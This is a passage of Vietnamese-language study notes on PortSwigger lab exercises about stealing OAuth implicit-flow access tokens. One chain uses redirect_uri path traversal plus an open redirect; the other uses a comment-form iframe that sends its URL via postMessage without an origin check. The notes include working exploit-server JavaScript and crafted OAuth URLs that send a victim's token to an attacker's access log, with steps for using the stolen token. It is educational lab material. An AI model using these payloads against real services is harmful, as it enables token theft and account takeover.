Attacker chain các lỗ hổng này để **redirect victim's access token** đến exploit server.

**OAuth Implicit Flow với Access Token**

```jsx
╔══════════════════════════════════════════════════════════════════════════════╗
║                         OAUTH IMPLICIT FLOW                                  ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║   Implicit Flow (deprecated, insecure):                                      ║
║   ────────────────────────────────────                                       ║
║   • Dành cho client-side apps (JavaScript)                                   ║
║   • Không có client_secret                                                   ║
║   • Access token trả về TRỰC TIẾP trong URL fragment                         ║
║                                                                              ║
║   ┌────────────────────────────────────────────────────────────────────┐     ║
║   │                                                                    │     ║
║   │   1. User click "Login"                                            │     ║
║   │      → Redirect: /auth?response_type=token&redirect_uri=...        │     ║
║   │                                   ▲▲▲▲▲                            │     ║
║   │                                   token (không phải code!)          │     ║
║   │                                                                    │     ║
║   │   2. User authenticate                                             │     ║
║   │                                                                    │     ║
║   │   3. OAuth provider redirect:                                      │     ║
║   │      https://blog.com/callback#access_token=ABC123&...             │     ║
║   │                              ▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲               │     ║
║   │                              URL FRAGMENT (sau #)                  │     ║
║   │                                                                    │     ║
║   │   4. JavaScript extract token từ fragment                          │     ║
║   │      var token = window.location.hash.split('=')[1]                │     ║
║   │                                                                    │     ║
║   │   5. Use token để call API                                         │     ║
║   │      GET /me                                                       │     ║
║   │      Authorization: Bearer ABC123                                  │     ║
║   │                                                                    │     ║
║   └────────────────────────────────────────────────────────────────────┘     ║
║                                                                              ║
║   ⚠️  URL FRAGMENT:                                                          ║
║   • Không gửi đến server (client-side only)                                  ║
║   • Nhưng có thể leak qua Referer header nếu navigate đi                    ║
║   • Có thể steal bằng JavaScript                                            ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

**Lỗ hổng 1: Path Traversal trong redirect_uri**

```jsx
╔══════════════════════════════════════════════════════════════════════════════╗
║                         PATH TRAVERSAL BYPASS                                ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║   OAuth provider validation:                                                 ║
║   ──────────────────────────                                                 ║
║   • Whitelist: https://blog.web-security-academy.net/oauth-callback          ║
║   • Check: redirect_uri.startsWith(whitelist)                                ║
║                                                                              ║
║   ❌ BYPASS với path traversal:                                              ║
║   ──────────────────────────────                                             ║
║                                                                              ║
║   redirect_uri = https://blog.net/oauth-callback/../post?postId=1            ║
║                  └──────────┬────────┘└──┬──┘                               ║
║                        Whitelist      Traversal                              ║
║                                                                              ║
║   Validation:                                                                ║
║   • startsWith("https://blog.net/oauth-callback") → TRUE ✓                   ║
║   • Pass validation!                                                         ║
║                                                                              ║
║   Browser navigation:                                                        ║
║   • Browser normalize: /oauth-callback/../post → /post                       ║
║   • Final URL: https://blog.net/post?postId=1#access_token=...               ║
║                                                                              ║
║   📌 Token delivered đến /post thay vì /oauth-callback!                      ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

**Lỗ hổng 2: Open Redirect**

```jsx
╔══════════════════════════════════════════════════════════════════════════════╗
║                         OPEN REDIRECT                                        ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║   Endpoint: /post/next?path=                                                 ║
║                                                                              ║
║   GET /post/next?path=/post/2 HTTP/2                                         ║
║   → 302 Redirect: Location: /post/2                                          ║
║                                                                              ║
║   ❌ KHÔNG validate path parameter:                                          ║
║   ──────────────────────────────────                                         ║
║                                                                              ║
║   GET /post/next?path=https://evil.com                                       ║
║   → 302 Redirect: Location: https://evil.com                                 ║
║                                                                              ║
║   📌 Có thể redirect đến ARBITRARY domain!                                   ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

**Flow tấn công (Chain exploits)**

```jsx
┌─────────────────────────────────────────────────────────────────────────────┐
│                              ATTACK FLOW                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  Mục tiêu: Steal admin's access token                                       │
│                                                                             │
│  STEP 1: Craft malicious OAuth URL                                          │
│  ═══════════════════════════════════════                                    │
│                                                                             │
│  https://oauth-server.net/auth?                                             │
│    client_id=xxx&                                                           │
│    redirect_uri=https://blog.net/oauth-callback/../post/next?path=https://exploit.net/exploit&
│                 └──────────┬────────┘└──┬──┘└────┬───┘└─────────┬────────┘ │
│                      Whitelist      Traversal   Open    Attacker's server   │
│                                              redirect                        │
│    response_type=token&                                                     │
│    scope=openid profile email                                               │
│                                                                             │
│  STEP 2: Admin visits malicious URL                                         │
│  ═══════════════════════════════════════                                    │
│                                                                             │
│     Admin Browser              OAuth Server              Blog              │
│         │                          │                       │               │
│         │  1. Visit malicious URL  │                       │               │
│         │  (trong iframe)           │                       │               │
│         │─────────────────────────>│                       │               │
│         │                          │                       │               │
│         │              ┌───────────┴──────────┐            │               │
│         │              │ Admin có active      │            │               │
│         │              │ session → Auto       │            │               │
│         │              │ generate token       │            │               │
│         │              └───────────┬──────────┘            │               │
│         │                          │                       │               │
│         │  2. Redirect với token   │                       │               │
│         │  https://blog.net/oauth-callback/../post/next?path=exploit.net#access_token=ADMIN_TOKEN
│         │<─────────────────────────│                       │               │
│         │                          │                       │               │
│         │  3. Browser normalize    │                       │               │
│         │  → https://blog.net/post/next?path=exploit.net#access_token=...  │
│         │                                                  │               │
│         │  4. GET /post/next?path=exploit.net              │               │
│         │─────────────────────────────────────────────────>│               │
│         │                                                  │               │
│         │                              ┌───────────────────┴──────────┐     │
│         │                              │ Open redirect:              │     │
│         │                              │ 302 Location: exploit.net   │     │
│         │                              └───────────────────┬──────────┘     │
│         │                                                  │               │
│         │  5. Redirect to exploit.net                      │               │
│         │  (Token vẫn trong fragment!)                     │               │
│         │<─────────────────────────────────────────────────│               │
│         │                                                                  │
│         │  6. https://exploit.net/exploit#access_token=ADMIN_TOKEN         │
│         │     ▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲              │
│         │     Fragment được giữ qua redirect!                              │
│         │                                                                  │
│         │  7. JavaScript trên exploit.net:                                 │
│         │     var token = location.hash.substr(1)                          │
│         │     location = '/?'+token  // Leak via access log                │
│         │                                                                  │
│         │  8. GET /?access_token=ADMIN_TOKEN                               │
│         │     (Attacker thấy trong access log!)                            │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

```jsx
╔══════════════════════════════════════════════════════════════════════════════╗
║                         EXPLOIT SCRIPT                                       ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║   Exploit Server - /exploit:                                                 ║
║   ──────────────────────────                                                 ║
║                                                                              ║
║   <script>                                                                   ║
║   // Check if we have fragment (access token)                                ║
║   if (!document.location.hash) {                                             ║
║       // STEP 1: Chưa có token → Redirect đến OAuth flow                     ║
║       window.location = 'https://oauth-xxx.oauth-server.net/auth?' +         ║
║           'client_id=abc123&' +                                              ║
║           'redirect_uri=https://blog.net/oauth-callback/../post/next?' +     ║
║           'path=https://exploit.net/exploit&' +                              ║
║           'response_type=token&' +                                           ║
║           'nonce=12345&' +                                                   ║
║           'scope=openid%20profile%20email';                                  ║
║   } else {                                                                   ║
║       // STEP 2: Đã có token trong fragment → Leak via query string          ║
║       // document.location.hash = "#access_token=xyz..."                     ║
║       // .substr(1) removes the # → "access_token=xyz..."                    ║
║       window.location = '/?' + document.location.hash.substr(1);             ║
║   }                                                                          ║
║   </script>                                                                  ║
║                                                                              ║
║   ───────────────────────────────────────────────────────────────            ║
║   Flow khi admin visit:                                                      ║
║   ───────────────────────────────────────────────────────────────            ║
║                                                                              ║
║   1. Admin opens iframe với exploit.net/exploit                              ║
║   2. Script check: no hash → redirect to OAuth                               ║
║   3. OAuth flow → redirect back với #access_token=...                        ║
║   4. Script check: has hash → redirect to /?access_token=...                 ║
║   5. Attacker sees token in access log!                                      ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

# **Lab 06: Stealing OAuth access tokens via a proxy page**

Lab này chain **2 lỗ hổng** để steal OAuth access token:

1. **Path traversal trong redirect_uri**: Redirect token đến arbitrary page trên blog
2. **postMessage() vulnerability**: Trang comment form gửi `window.location.href` (bao gồm token) đến parent window mà **không validate origin**

Attacker tạo iframe chứa comment form, listen postMessage(), nhận được full URL kèm access token.

**postMessage() API**

```jsx
╔══════════════════════════════════════════════════════════════════════════════╗
║                         postMessage() API                                    ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║   Mục đích: Cross-origin communication giữa windows/iframes                  ║
║                                                                              ║
║   Syntax:                                                                    ║
║   ────────                                                                   ║
║   window.postMessage(message, targetOrigin)                                  ║
║                                                                              ║
║   SENDING side (iframe):                                                     ║
║   ──────────────────────                                                     ║
║   // Gửi data đến parent window                                              ║
║   window.parent.postMessage({                                                ║
║       type: 'location',                                                      ║
║       data: window.location.href  // Bao gồm fragment!                       ║
║   }, '*');  // ❌ targetOrigin = '*' = ANY ORIGIN                            ║
║                                                                              ║
║   RECEIVING side (parent):                                                   ║
║   ────────────────────────                                                   ║
║   window.addEventListener('message', function(e) {                           ║
║       // e.origin = origin của sender                                        ║
║       // e.data = message data                                               ║
║       console.log('Received:', e.data);                                      ║
║   });                                                                        ║
║                                                                              ║
║   ┌────────────────────────────────────────────────────────────────────┐     ║
║   │                                                                    │     ║
║   │   ❌ INSECURE (targetOrigin = '*'):                                │     ║
║   │   ──────────────────────────────────                               │     ║
║   │   window.parent.postMessage(data, '*');                            │     ║
║   │   → Bất kỳ parent window nào cũng nhận được                        │     ║
║   │   → Attacker's page có thể listen!                                 │     ║
║   │                                                                    │     ║
║   │   ✅ SECURE (validate origin):                                     │     ║
║   │   ────────────────────────────                                     │     ║
║   │   // Sender                                                        │     ║
║   │   window.parent.postMessage(data, 'https://trusted.com');          │     ║
║   │                                                                    │     ║
║   │   // Receiver                                                      │     ║
║   │   window.addEventListener('message', function(e) {                 │     ║
║   │       if (e.origin !== 'https://trusted.com') return;              │     ║
║   │       // Process message                                           │     ║
║   │   });                                                              │     ║
║   │                                                                    │     ║
║   └────────────────────────────────────────────────────────────────────┘     ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

**Comment Form Vulnerability**

```jsx
╔══════════════════════════════════════════════════════════════════════════════╗
║                         COMMENT FORM CODE                                    ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║   Page: /post/comment/comment-form                                           ║
║   Purpose: Embedded iframe trong blog posts để submit comments               ║
║                                                                              ║
║   ❌ VULNERABLE CODE:                                                        ║
║   ──────────────────────                                                     ║
║                                                                              ║
║   <script>                                                                   ║
║   // Send current URL to parent window                                       ║
║   window.parent.postMessage({                                                ║
║       type: 'onload',                                                        ║
║       data: window.location.href  // ❌ Includes fragment!                   ║
║   }, '*');  // ❌ No origin validation!                                      ║
║   </script>                                                                  ║
║                                                                              ║
║   Khi comment form loaded:                                                   ║
║   ─────────────────────────                                                  ║
║   1. Page loads trong iframe                                                 ║
║   2. Script gửi window.location.href đến parent                              ║
║   3. window.location.href bao gồm EVERYTHING trong URL                       ║
║      • Protocol, host, path, query, FRAGMENT                                 ║
║   4. targetOrigin = '*' → BẤT KỲ parent nào cũng nhận được                   ║
║                                                                              ║
║   ┌────────────────────────────────────────────────────────────────────┐     ║
║   │                                                                    │     ║
║   │   Normal usage (legitimate):                                       │     ║
║   │   ───────────────────────────                                      │     ║
║   │   Blog post page                                                   │     ║
║   │   └── <iframe src="/post/comment/comment-form">                    │     ║
║   │       → postMessage() → Blog post receives URL                     │     ║
║   │                                                                    │     ║
║   │   Malicious usage (attack):                                        │     ║
║   │   ──────────────────────────                                       │     ║
║   │   Exploit server page                                              │     ║
║   │   └── <iframe src="blog.com/post/comment/comment-form#token=..."> │     ║
║   │       → postMessage() → Exploit server receives URL với token! ✓   │     ║
║   │                                                                    │     ║
║   └────────────────────────────────────────────────────────────────────┘     ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

**Flow tấn công**

```jsx
┌─────────────────────────────────────────────────────────────────────────────┐
│                              ATTACK FLOW                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  STEP 1: Craft malicious OAuth URL                                          │
│  ═══════════════════════════════════════                                    │
│                                                                             │
│  https://oauth-server.net/auth?                                             │
│    client_id=xxx&                                                           │
│    redirect_uri=https://blog.net/oauth-callback/../post/comment/comment-form&
│                 └──────────┬────────┘└──────────┬────────────┘             │
│                       Whitelist           Path traversal                    │
│                                           → Comment form                    │
│    response_type=token&                                                     │
│    scope=openid profile email                                               │
│                                                                             │
│  STEP 2: Create exploit page với iframe                                     │
│  ═══════════════════════════════════════════                                │
│                                                                             │
│     Exploit Server                    Admin Browser                         │
│         │                                  │                                │
│         │  <iframe src="[OAuth URL]">     │                                │
│         │  <script>                        │                                │
│         │    addEventListener('message')   │                                │
│         │  </script>                       │                                │
│         │                                  │                                │
│         │  Admin visits exploit page       │                                │
│         │─────────────────────────────────>│                                │
│         │                                  │                                │
│         │              ┌───────────────────┴─────────────┐                  │
│         │              │ Browser loads exploit page      │                  │
│         │              │ • Execute script (listener)     │                  │
│         │              │ • Load iframe                   │                  │
│         │              └───────────────────┬─────────────┘                  │
│                                            │                                │
│  STEP 3: Iframe loads OAuth flow                                            │
│  ═══════════════════════════════════════                                    │
│                                                                             │
│     Admin Browser (iframe)          OAuth Server                            │
│         │                                  │                                │
│         │  GET /auth?...                   │                                │
│         │  (Admin có active session)       │                                │
│         │─────────────────────────────────>│                                │
│         │                                  │                                │
│         │              ┌───────────────────┴─────────────┐                  │
│         │              │ Auto-approve                    │                  │
│         │              │ Generate token                  │                  │
│         │              └───────────────────┬─────────────┘                  │
│         │                                  │                                │
│         │  302 Redirect:                   │                                │
│         │  blog.net/oauth-callback/../post/comment/comment-form#access_token=ADMIN_TOKEN
│         │<─────────────────────────────────│                                │
│         │                                  │                                │
│         │  Browser normalize path:         │                                │
│         │  → blog.net/post/comment/comment-form#access_token=ADMIN_TOKEN    │
│                                                                             │
│  STEP 4: Comment form loads và postMessage()                                │
│  ═══════════════════════════════════════════════                            │
│                                                                             │
│     Comment Form (iframe)            Parent Window (exploit page)           │
│         │                                  │                                │
│         │  GET /post/comment/comment-form  │                                │
│         │  (URL includes fragment!)        │                                │
│         │                                  │                                │
│         │  Page loads                      │                                │
│         │  Execute script:                 │                                │
│         │                                  │                                │
│         │  window.parent.postMessage({     │                                │
│         │    type: 'onload',               │                                │
│         │    data: window.location.href    │                                │
│         │  }, '*');                        │                                │
│         │                                  │                                │
│         │  Message sent ─────────────────>│                                │
│         │  data = "https://blog.net/post/comment/comment-form#access_token=ADMIN_TOKEN"
│         │                                  │                                │
│         │              ┌───────────────────┴─────────────┐                  │
│         │              │ Event listener triggered:       │                  │
│         │              │ e.data.data = full URL + token  │                  │
│         │              │                                 │                  │
│         │              │ fetch("/" + e.data.data)        │                  │
│         │              │ → Leak to access log!           │                  │
│         │              └───────────────────┬─────────────┘                  │
│         │                                  │                                │
│         │                                  │  GET /?https://blog.net/...#access_token=ADMIN_TOKEN
│         │                                  │─────────────────────────>      │
│         │                                                    Exploit Server  │
│         │                                                    Access Log      │
│                                                                             │
│  STEP 5: Extract token từ access log                                        │
│  ═══════════════════════════════════════                                    │
│                                                                             │
│  Access log:                                                                │
│  GET /?https%3A%2F%2Fblog.net%2Fpost%2Fcomment%2Fcomment-form%23access_token%3DADMIN_TOKEN
│                                                     ▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲    │
│                                                     URL-encoded token        │
│                                                                             │
│  URL decode → Extract token                                                 │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

```jsx
╔══════════════════════════════════════════════════════════════════════════════╗
║                         EXPLOIT CODE                                         ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║   Exploit Server - Body:                                                     ║
║   ──────────────────────                                                     ║
║                                                                              ║
║   <!-- IFRAME: Trigger OAuth flow với redirect đến comment form -->          ║
║   <iframe src="https://oauth-OAUTH-ID.oauth-server.net/auth?                 ║
║       client_id=abc123&                                                      ║
║       redirect_uri=https://LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&
║       response_type=token&                                                   ║
║       nonce=12345&                                                           ║
║       scope=openid%20profile%20email">                                       ║
║   </iframe>                                                                  ║
║                                                                              ║
║   <!-- SCRIPT: Listen for postMessage từ iframe -->                          ║
║   <script>                                                                   ║
║   window.addEventListener('message', function(e) {                           ║
║       // e.data = {type: 'onload', data: 'full URL with token'}             ║
║       // e.data.data = "https://blog.net/...#access_token=..."               ║
║                                                                              ║
║       // Leak token via access log                                           ║
║       fetch("/" + encodeURIComponent(e.data.data));                          ║
║       // Request: GET /?https%3A%2F%2F...%23access_token%3D...               ║
║   }, false);                                                                 ║
║   </script>                                                                  ║
║                                                                              ║
║   ───────────────────────────────────────────────────────────────            ║
║   How it works:                                                              ║
║   ───────────────────────────────────────────────────────────────            ║
║                                                                              ║
║   1. Admin visits exploit page                                               ║
║   2. Script sets up message listener                                         ║
║   3. Iframe loads OAuth URL                                                  ║
║   4. OAuth flow: Admin auto-approved → Redirect với token                    ║
║   5. Redirect to: blog.net/post/comment/comment-form#access_token=...        ║
║   6. Comment form loads trong iframe                                         ║
║   7. Comment form postMessage() sends URL (with token) to parent             ║
║   8. Parent listener receives message                                        ║
║   9. fetch() sends token to exploit server → Access log                      ║
║   10. Attacker reads token từ log                                            ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

```jsx
# 6. Key Technical Points
```
╔══════════════════════════════════════════════════════════════════════════════╗
║                         KEY TECHNICAL INSIGHTS                               ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║   1. URL FRAGMENT TRONG postMessage():                                       ║
║   ──────────────────────────────────────                                     ║
║   • window.location.href includes EVERYTHING                                 ║
║   • Fragment (#access_token=...) is included                                 ║
║   • postMessage() sends complete URL string                                  ║
║                                                                              ║
║   2. CROSS-ORIGIN COMMUNICATION:                                             ║
║   ───────────────────────────────                                            ║
║   • Iframe (blog.net) → Parent (exploit.net)                                 ║
║   • Different origins nhưng postMessage() allows                             ║
║   • targetOrigin='*' → No restriction                                        ║
║                                                                              ║
║   3. PATH TRAVERSAL BYPASS:                                                  ║
║   ───────────────────────────                                                ║
║   • OAuth validates: startsWith('/oauth-callback')                           ║
║   • Payload: /oauth-callback/../post/comment/comment-form                    ║
║   • Browser normalizes → /post/comment/comment-form                          ║
║                                                                              ║
║   4. AUTO-APPROVAL với ACTIVE SESSION:                                       ║
║   ──────────────────────────────────────                                     ║
║   • Admin đã login OAuth provider                                            ║
║   • Iframe sends OAuth session cookie automatically                          ║
║   • OAuth auto-generates token (no user interaction)                         ║
║                                                                              ║
║   5. LEAK METHOD:                                                            ║
║   ────────────────                                                           ║
║   • Cannot use Referer (fragment not sent)                                   ║
║   • Cannot navigate away (loses fragment)                                    ║
║   • Use postMessage() to get fragment from iframe                            ║
║   • Use fetch() to leak via query string to access log                       ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

---

## 7. Các bước khai thác

| Bước | Hành động | Kết quả |
|:----:|-----------|---------|
| 1 | Login `wiener:peter`, observe OAuth flow | Identify path traversal |
| 2 | Test path traversal: `redirect_uri=.../oauth-callback/../post` | Works ✓ |
| 3 | Audit blog pages, find comment form | Identify iframe usage |
| 4 | Analyze `/post/comment/comment-form` | postMessage() vulnerability |
| 5 | Observe: `postMessage(window.location.href, '*')` | Sends URL to any parent |
| 6 | Craft OAuth URL với redirect to comment form | Chain vulnerabilities |
| 7 | Create exploit với iframe + listener | Prepare attack |
| 8 | Test: Store & View exploit | Verify message received |
| 9 | Check access log | Token appears ✓ |
| 10 | Deliver to victim | Admin visits |
| 11 | Extract admin's token từ log | URL decode token |
| 12 | Use token: `GET /me` with `Authorization: Bearer` | Get admin's API key |
| 13 | Submit API key | ✅ Lab solved! |

---

## 8. So sánh với lab trước
```
╔══════════════════════════════════════════════════════════════════════════════╗
║                    LAB TRƯỚC vs LAB NÀY                                      ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║   LAB TRƯỚC (Open Redirect):                                                 ║
║   ────────────────────────────                                               ║
║   • Dùng open redirect (/post/next?path=...)                                 ║
║   • Chain: OAuth → Path traversal → Open redirect → Exploit server          ║
║   • Token navigate đến exploit.net#access_token=...                          ║
║   • JavaScript trên exploit server extract fragment                          ║
║                                                                              ║
║   redirect_uri = /oauth-callback/../post/next?path=https://exploit.net       ║
║                                                                              ║
║   ───────────────────────────────────────────────────────────────            ║
║                                                                              ║
║   LAB NÀY (Proxy Page):                                                      ║
║   ──────────────────────                                                     ║
║   • Dùng postMessage() vulnerability                                         ║
║   • Chain: OAuth → Path traversal → Comment form → postMessage()            ║
║   • Token ở blog.net nhưng leaked qua postMessage()                          ║
║   • Exploit server listen message từ iframe                                  ║
║                                                                              ║
║   redirect_uri = /oauth-callback/../post/comment/comment-form                ║
║                                                                              ║
║   ───────────────────────────────────────────────────────────────            ║
║                                                                              ║
║   TẠI SAO CẦN LAB NÀY?                                                       ║
║   ─────────────────                                                          ║
║   • Open redirect dễ fix (validate redirect destination)                     ║
║   • postMessage() vulnerability khó phát hiện hơn                            ║
║   • Realistic: Many apps dùng postMessage() cho iframe communication         ║
║   • Shows importance of origin validation                                    ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
```
